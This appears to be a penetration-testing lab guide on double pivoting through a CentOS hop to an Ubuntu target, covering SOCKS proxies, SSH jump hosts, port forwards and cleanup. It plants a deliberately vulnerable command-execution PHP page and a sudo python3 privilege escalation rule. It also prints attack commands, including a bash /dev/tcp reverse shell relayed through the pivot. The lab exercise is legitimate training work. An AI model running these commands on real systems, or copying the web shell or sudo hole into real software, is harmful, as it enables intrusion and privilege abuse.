# CPTS Lab: Double Pivoting — Two Hops to the Target

## Objective

Practice reaching a target that is TWO network hops away from Kali. This is a common CPTS exam scenario — the internal network has multiple segments, and you must chain tunnels to reach the deepest targets.

## Network

```
Kali (192.168.244.129)
  │
  │  192.168.244.0/24 (you can reach this)
  ↓
CentOS — Hop 1 (192.168.244.131 + 172.16.0.1)
  │
  │  172.16.0.0/24 (only CentOS can reach this)
  ↓
Ubuntu — Hop 2 (172.16.0.2)
  │
  │  Ubuntu has a web app on port 80 that you need to access
  │  Ubuntu has a flag at /root/flag.txt
  ↓
  Your goal: access Ubuntu's web app and get root
```

**Key constraint:** Kali cannot reach 172.16.0.2 directly. CentOS bridges the gap.

---

## Setup

### CentOS (192.168.244.131 / 172.16.0.1)

```bash
sudo systemctl stop firewalld && sudo systemctl disable firewalld
sudo systemctl enable --now sshd

sudo ip addr add 172.16.0.1/24 dev ens224 2>/dev/null
sudo ip link set ens224 up

sudo useradd -m -s /bin/bash pivot1
echo "pivot1:P1v0tH0p1!" | sudo chpasswd

sudo sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
sudo sed -i 's/#AllowTcpForwarding yes/AllowTcpForwarding yes/' /etc/ssh/sshd_config
sudo sed -i 's/#GatewayPorts no/GatewayPorts yes/' /etc/ssh/sshd_config
sudo systemctl restart sshd

sudo iptables -F
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p icmp -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT ACCEPT
sudo iptables -A FORWARD -j ACCEPT
sudo iptables -t nat -A POSTROUTING -o ens224 -j MASQUERADE
```

### Ubuntu (172.16.0.2)

```bash
sudo ip addr add 172.16.0.2/24 dev ens38 2>/dev/null
sudo ip link set ens38 up
sudo apt update && sudo apt install openssh-server apache2 php -y
sudo systemctl enable --now ssh apache2

sudo useradd -m -s /bin/bash pivot2
echo "pivot2:P1v0tH0p2!" | sudo chpasswd

echo "FLAG{double_pivot_complete_$(openssl rand -hex 8)}" | sudo tee /root/flag.txt
sudo chmod 600 /root/flag.txt

# Web app only accessible from 172.16.0.0/24
cat << 'PHPEOF' | sudo tee /var/www/html/index.php
<?php
$output = "";
if(isset($_GET['cmd'])) { $output = shell_exec($_GET['cmd'] . " 2>&1"); }
?>
<html><body>
<h1>Internal Management Console</h1>
<p>Server: <?= gethostname() ?> | IP: <?= $_SERVER['SERVER_ADDR'] ?></p>
<form method="GET">
Command: <input name="cmd" size="40" placeholder="hostname">
<button>Execute</button>
</form>
<?php if($output): ?><pre><?php echo htmlspecialchars($output); ?></pre><?php endif; ?>
<p><small>Authorized IT personnel only.</small></p>
</body></html>
PHPEOF

# Privesc: sudo python3
echo "pivot2 ALL=(root) NOPASSWD: /usr/bin/python3" | sudo tee /etc/sudoers.d/pivot2

# Firewall: only allow from 172.16.0.0/24
sudo iptables -F
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -s 172.16.0.0/24 -j ACCEPT
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT ACCEPT
```

---

## Method 1: Chained SSH SOCKS Proxies

### Step 1: First SOCKS proxy through CentOS

```bash
# From Kali
ssh -D 9050 -fN pivot1@192.168.244.131
# Password: P1v0tH0p1!
```

**What this creates:** A SOCKS proxy on Kali port 9050 that exits from CentOS. Any traffic sent through this proxy reaches the 172.16.0.0/24 network.

### Step 2: Verify you can reach Ubuntu

```bash
# Configure proxychains: socks5 127.0.0.1 9050
proxychains curl http://172.16.0.2
# Should show: Internal Management Console
```

### Step 3: Interact with the web app through the proxy

```bash
# Execute commands on Ubuntu through the web app through the tunnel
proxychains curl 'http://172.16.0.2/?cmd=whoami'
proxychains curl 'http://172.16.0.2/?cmd=id'
proxychains curl 'http://172.16.0.2/?cmd=ip%20a'
proxychains curl --get http://172.16.0.2/ --data-urlencode "cmd=cat /etc/passwd"
```

### Step 4: SSH to Ubuntu through the proxy

```bash
proxychains ssh pivot2@172.16.0.2
# Password: P1v0tH0p2!

# Now you're ON Ubuntu
whoami    # pivot2

# Privesc
sudo python3 -c 'import os; os.system("/bin/bash")'
whoami    # root
cat /root/flag.txt
```

---

## Method 2: SSH Jump Host (-J)

The simplest approach — one command:

```bash
# From Kali — jump through CentOS to Ubuntu
ssh -J pivot1@192.168.244.131 pivot2@172.16.0.2
# Enter CentOS password: P1v0tH0p1!
# Enter Ubuntu password: P1v0tH0p2!
# You're on Ubuntu
```

**What `-J` does:** SSH connects to CentOS first, then FROM CentOS connects to Ubuntu. Two hops, one command.

### Jump + SOCKS (access the web app too)

```bash
ssh -D 9050 -J pivot1@192.168.244.131 pivot2@172.16.0.2
# SOCKS proxy exits from UBUNTU
# proxychains curl http://172.16.0.2 → goes to Ubuntu's localhost
```

### Jump + Local port forward (access a specific service)

```bash
ssh -L 8080:172.16.0.2:80 pivot1@192.168.244.131
# Now on Kali: curl http://localhost:8080 → Ubuntu's web app

# In another terminal
curl --get http://localhost:8080/ --data-urlencode "cmd=whoami"
```

---

## Method 3: Nested SSH from Each Host

Step by step through each machine manually:

```bash
# Step 1: SSH to CentOS from Kali
ssh pivot1@192.168.244.131

# Step 2: From CentOS, SSH to Ubuntu
ssh pivot2@172.16.0.2

# Step 3: You're on Ubuntu — privesc and get the flag
sudo python3 -c 'import os; os.system("/bin/bash")'
cat /root/flag.txt
```

This is simple but doesn't let you use Kali tools against Ubuntu. You can only use tools installed on CentOS and Ubuntu themselves.

---

## Method 4: Local Port Forward for Scanning

When you need to scan Ubuntu from Kali:

```bash
# Forward specific ports
ssh -L 8080:172.16.0.2:80 -L 2222:172.16.0.2:22 pivot1@192.168.244.131

# Now scan forwarded ports from Kali
nmap -sV -p 8080,2222 localhost
# 8080 → Ubuntu's web server
# 2222 → Ubuntu's SSH

# Access the web app
curl --get http://localhost:8080/ --data-urlencode "cmd=cat /etc/passwd"

# SSH through the forward
ssh pivot2@localhost -p 2222
```

---

## Method 5: Reverse Shell Through the Pivot

Get a shell from Ubuntu back to Kali through CentOS:

```bash
# Step 1: Set up a listener on Kali
nc -lvnp 4444

# Step 2: Access Ubuntu's web app through the tunnel
# The reverse shell payload needs to reach KALI, but Ubuntu can only reach CentOS
# Solution: forward a port on CentOS back to Kali

# On CentOS (or as part of your SSH connection):
ssh -R 4444:192.168.244.129:4444 pivot1@192.168.244.131
# This makes CentOS port 4444 forward to Kali port 4444

# Step 3: Trigger the reverse shell targeting CentOS's IP
proxychains curl --get http://172.16.0.2/ --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/172.16.0.1/4444 0>&1'"
# Ubuntu connects to CentOS:4444 → forwarded to Kali:4444 → shell on Kali!
```

**Why this is necessary:** Ubuntu can reach CentOS (172.16.0.1) but can't reach Kali (192.168.244.129) directly. The reverse SSH forward makes CentOS relay the connection back to Kali.

---

## Timed Challenge

Complete all 5 methods in under 30 minutes:

```
□ Method 1: SOCKS proxy + proxychains curl to web app     (5 min)
□ Method 2: SSH Jump to Ubuntu + privesc + flag            (3 min)
□ Method 3: Nested SSH manually                            (3 min)
□ Method 4: Local port forward + nmap scan                 (5 min)
□ Method 5: Reverse shell through the pivot                (10 min)
```

---

## Cleanup

```bash
# CentOS
sudo userdel -r pivot1
sudo iptables -F && sudo iptables -t nat -F && sudo iptables -P INPUT ACCEPT

# Ubuntu
sudo userdel -r pivot2
sudo rm /etc/sudoers.d/pivot2 /root/flag.txt
sudo rm /var/www/html/index.php
sudo iptables -F && sudo iptables -P INPUT ACCEPT

# Kali — kill background SSH tunnels
pkill -f "ssh -D"
pkill -f "ssh -L"
pkill -f "ssh -R"
```
